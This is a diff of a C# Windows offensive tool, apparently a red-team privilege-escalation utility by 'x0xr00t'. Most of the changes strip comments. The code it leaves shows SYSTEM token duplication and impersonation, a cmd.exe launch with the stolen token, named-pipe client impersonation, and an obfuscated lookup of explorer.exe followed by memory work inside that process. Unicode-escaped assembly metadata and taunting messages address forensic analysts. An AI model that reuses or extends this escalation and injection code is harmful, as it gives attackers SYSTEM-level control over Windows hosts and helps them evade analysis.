@@ -9,26 +9,23 @@ using System.Security.Principal;
 using System.Reflection;
 using System.IO;
 
-// Metadata Easter Egg
+
 using System.Reflection;
 using System.Runtime.CompilerServices;
 
-// Metadata Easter Egg
+
 [assembly: AssemblyTitle("\u004d\u0069\u006e\u0064\u0065\u0066\u0020\u003e\u0020\u0064\u002c\u0079\u002e\u007a\u002e\u002e\u002e\u0020\u0057\u0069\u006e\u006b")]
 [assembly: AssemblyDescription("\u0031\u002e\u0036\u002e\u0032\u002e\u0033\u0020\u0073\u0065\u006e\u0064\u0069\u006e\u0067\u0020\u006b\u0065\u0072\u006e\u0065\u006c\u0020\u006b\u0069\u0073\u0073\u0065\u0073\u0020\u002d\u0020\u0078\u0030\u0078\u0072\u0030\u0030\u0074")]
 [assembly: AssemblyCompany("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0049\u0020\u0064\u006f\u006e\u0027\u0074\u0020\u0062\u0072\u0065\u0061\u006b\u0020\u0074\u0068\u0069\u006e\u0067\u0073\u002c\u0020\u0069\u0020\u006a\u0075\u0073\u0074\u0020\u006d\u0061\u006b\u0065\u0020\u0074\u0068\u0065\u006d\u0020\u006d\u006f\u0072\u0065\u0020\u0069\u006e\u0074\u0065\u0072\u0065\u0073\u0074\u0069\u006e\u0067\u002e\u0027")]
 [assembly: AssemblyTrademark("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0052\u0065\u0063\u006f\u006e\u0020\u0066\u0069\u0072\u0073\u0074\u002c\u0020\u0072\u006f\u006f\u0074\u0020\u006c\u0061\u0074\u0065\u0072\u002c\u0020\u0073\u0063\u0072\u0065\u0065\u006e\u0073\u0068\u006f\u0074\u0073\u0020\u0061\u006c\u0077\u0061\u0079\u0073\u002e\u0027")]
 [assembly: AssemblyProduct("\u0052\u0065\u0064\u0020\u0054\u0065\u0061\u006d\u0027\u0073\u0020\u0042\u0065\u0073\u0074\u0020\u0046\u0072\u0069\u0065\u006e\u0064\u2122")]
 
-// Intel
 [assembly: AssemblyInformationalVersion("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u004f\u006e\u0065\u0020\u0049\u004f\u0043\u0020\u0077\u0061\u006c\u006b\u0073\u0020\u0069\u006e\u0074\u006f\u0020\u0061\u0020\u0074\u0069\u006d\u0065\u006c\u0069\u006e\u0065\u002e\u002e\u002e\u0020\u0073\u0015\u0064\u0064\u0065\u006e\u006c\u0073\u0020\u0065\u0076\u0065\u0072\u0079\u006f\u006e\u0065\u0020\u0068\u0061\u0073\u0020\u0071\u0075\u0065\u0073\u0074\u0069\u006f\u006e\u0073\u002e\u0027")]
 
-// Forensics
 [assembly: AssemblyCopyright("\u0043\u006f\u0070\u0079\u0072\u0069\u0067\u0068\u0074\u0020\u00a9\u0020\u0032\u0030\u0032\u0036\u0020\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u002e\u0020\u0041\u006c\u006c\u0020\u0072\u0069\u0067\u0068\u0074\u0073\u0020\u0072\u0065\u0073\u0065\u0072\u0076\u0065\u0064\u002e\u0020\u0041\u006e\u0061\u006c\u0079\u0073\u0074\u0073\u003a\u0020\u004e\u006f\u0020\u0020\u0072\u0069\u0067\u0068\u0074\u0073\u0020\u0072\u0065\u0073\u0065\u0072\u0076\u0065\u0064\u002e")]
 [assembly: AssemblyMetadata("\u0046\u006f\u0072\u0065\u006e\u0073\u0069\u0063\u0073\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0054\u0068\u0065\u0020\u0066\u0069\u006c\u0065\u0073\u0079\u0073\u0074\u0065\u006d\u0020\u0072\u0065\u006d\u0065\u006d\u0062\u0065\u0072\u0073\u0020\u0077\u0068\u0061\u0074\u0020\u0079\u006f\u0075\u0020\u0066\u006f\u0072\u0067\u006f\u0074\u0020\u0074\u006f\u0020\u0064\u0065\u006c\u0065\u0074\u0065\u002e\u0027")]
 [assembly: AssemblyMetadata("\u0045\u0076\u0069\u0064\u0065\u006e\u0063\u0065\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0048\u0061\u0073\u0068\u0020\u0069\u0074\u0020\u0066\u0069\u0072\u0073\u0074\u002e\u0020\u0054\u006f\u0075\u0063\u0068\u0020\u0069\u0074\u0020\u006e\u0065\u0076\u0065\u0072\u002e\u0020\u0042\u006c\u0061\u006d\u0065\u0020\u0074\u0068\u0065\u0020\u0074\u0069\u006d\u0065\u006c\u0069\u006e\u0065\u0020\u006c\u0061\u0074\u0065\u0072\u002e\u0027")]
 
-// Fans
 [assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u0020\u0046\u0041\u004e\u0053\u003a\u0020\u0027\u0059\u006f\u0075\u0020\u0062\u0072\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0063\u006f\u0066\u0066\u0065\u0065\u002c\u0020\u0069\u0027\u006c\u006c\u0020\u0062\u0072\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0077\u0065\u0069\u0072\u0064\u0020\u0062\u0069\u006e\u0061\u0072\u0069\u0065\u0073\u002e\u0027")]
 [assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0032", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0050\u006f\u0077\u0065\u0072\u0065\u0064\u0020\u0062\u0069\u0063\u0020\u0063\u0061\u0066\u0066\u0065\u0069\u006e\u0065\u002c\u0020\u0063\u0075\u0072\u0069\u006f\u0073\u0069\u0074\u007a\u002c\u0020\u0061\u006e\u0064\u0020\u0071\u0075\u0065\u0073\u0074\u0069\u006f\u006e\u0061\u0062\u006c\u0065\u0020\u0074\u0065\u0072\u006d\u0069\u006e\u0061\u006c\u0020\u0074\u0061\u0062\u0073\u002e\u0027")]
 [assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0033", "\u0053\u0074\u0061\u007a\u0020\u0073\u006c\u0030\u0070\u0070\u007a\u002e\u0020\u0053\u0074\u0061\u007a\u0020\u0063\u0075\u0072\u0069\u006f\u0073\u002e\u0020\u004b\u0065\u0065\u0070\u0020\u0074\u0068\u0065\u0020\u0074\u0065\u0072\u006d\u0069\u006e\u0061\u006c\u0020\u0067\u006c\u006f\u0077\u0069\u006e\u0067\u002e\u0027")]
@@ -80,7 +77,6 @@ using System.Runtime.CompilerServices;
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CloseHandle(IntPtr hObject);
 
-        // Constants
         const uint TOKEN_DUPLICATE = 0x0002;
         const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
         const uint TOKEN_QUERY = 0x0008;
@@ -324,8 +320,7 @@ using System.Runtime.CompilerServices;
                 }
             }
         }
-
-        //   2. Originele token-duplicatie en impersonatie + CreateProcess uitbreiding
+      
         IntPtr hToken = IntPtr.Zero;
         IntPtr hProcess = IntPtr.Zero;
         try
@@ -345,14 +340,12 @@ using System.Runtime.CompilerServices;
                     // Actie A: Huidige thread impersoneren
                     ImpersonateLoggedOnUser(duplicatedToken);
 
-                    // Actie B: Volledig nieuw proces (CMD) starten als SYSTEM
                     STARTUPINFO si = new STARTUPINFO();
                     si.cb = (uint)Marshal.SizeOf(si);
-                    si.lpDesktop = "WinSta0\\Default"; // Zorgt ervoor dat de GUI zichtbaar is
+                    si.lpDesktop = "WinSta0\\Default"; 
 
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                 
-                    // Lanceren van het subproces met het SYSTEM-token
                     if (CreateProcessWithTokenW(duplicatedToken, 1, null, "cmd.exe", 0, IntPtr.Zero, null, ref si, out pi))
                     {
                         CloseHandle(pi.hProcess);
@@ -390,7 +383,6 @@ private static void NamedPipeSystemEscalation()
 
         if (hPipe != IntPtr.Zero && hPipe.ToInt64() != -1)
         {
-            // --- extension: log where the silent version would silently fail ---
             Console.WriteLine("[pipe] created, waiting for a client to connect...");
 
             if (!ConnectNamedPipe(hPipe, IntPtr.Zero))
@@ -407,8 +399,6 @@ private static void NamedPipeSystemEscalation()
 
             Console.WriteLine("[pipe] client connected");
 
-            // Read what the client sent: proves the pipe session is live
-            // before we try to adopt its token.
             byte[] buf = new byte[256];
             if (ReadFile(hPipe, buf, (uint)buf.Length, out uint read, IntPtr.Zero))
                 Console.WriteLine($"[pipe] client wrote {read} bytes: " +
@@ -424,7 +414,6 @@ private static void NamedPipeSystemEscalation()
                 return;
             }
 
-            // --- extension: show whose token the thread now carries ---
             DumpThreadToken("[pipe] token now on thread");
         }
         else
@@ -438,15 +427,13 @@ private static void NamedPipeSystemEscalation()
     }
     finally
     {
-        // Detach from the borrowed token first — without this the thread keeps
-        // running with the client's credentials after the method returns.
+
         RevertToSelf();
         if (hPipe != IntPtr.Zero) CloseHandle(hPipe);
         Console.WriteLine("[pipe] reverted + handle closed");
     }
 }
 
-// --- extension helper: dump the thread's current token (user / elevation / session) ---
 private static void DumpThreadToken(string prefix)
 {
     const uint TOKEN_QUERY = 0x0008;
@@ -459,7 +446,7 @@ private static void DumpThreadToken(string prefix)
     }
     try
     {
-        // TokenUser=1, TokenElevation=20, TokenSessionId=12
+
         GetTokenInformation(hTok, 1, IntPtr.Zero, 0, out uint need);
         IntPtr p = Marshal.AllocHGlobal((int)need);
         string user;
@@ -500,7 +487,7 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
         IntPtr addr = IntPtr.Zero;
         try
         {
-            // Corrected base64 XOR string for "explorer"
+
             string exp = D("Fg8D/xwBFG8B==");
             Process target = Process.GetProcessesByName(exp).FirstOrDefault();
             if (target == null) return;
@@ -520,7 +507,7 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
         catch { }
         finally
         {
-            if (addr != IntPtr.Zero) { /* Memory in target process, cannot free directly */ }
+            if (addr != IntPtr.Zero) {}
             if (hProc != IntPtr.Zero) CloseHandle(hProc);
         }
     }
@@ -599,7 +586,7 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
                 "Nothing to see here. Definitely don't inspect the source code."
             };
 
-            // Pick a random starting point and print 3 consecutive (rotating) lines
+
             Random rng = new Random();
             int start = rng.Next(lines.Length);
 
@@ -637,7 +624,7 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
                 "We'd hide from you, but you'd just triage us as 'informational'."
             };
 
-            // Pick a random starting point and print 3 consecutive (rotating) lines
+
             Random rng = new Random();
             int start = rng.Next(lines.Length);
 
@@ -676,7 +663,6 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
                 "Congratulations. You found something. Now prove it wasn't a false positive."
             };
 
-            // Pick a random starting point and print 3 consecutive (rotating) lines
             Random rng = new Random();
             int start = rng.Next(lines.Length);
 
@@ -715,7 +701,7 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
                 "x0xr00t says: 'See you in the next security advisory.' ;)"
             };
 
-            // Pick a random starting point and print 3 consecutive (rotating) lines
+
             Random rng = new Random();
             int start = rng.Next(lines.Length);
 
@@ -755,7 +741,6 @@ private static uint TokenDword(IntPtr hTok, int infoClass)
                 "Stay cyan, stay curious, and keep those terminals busy. ;)"
             };
 
-            // Pick a random starting point and print 3 consecutive (rotating) lines
             Random rng = new Random();
             int start = rng.Next(lines.Length);
 
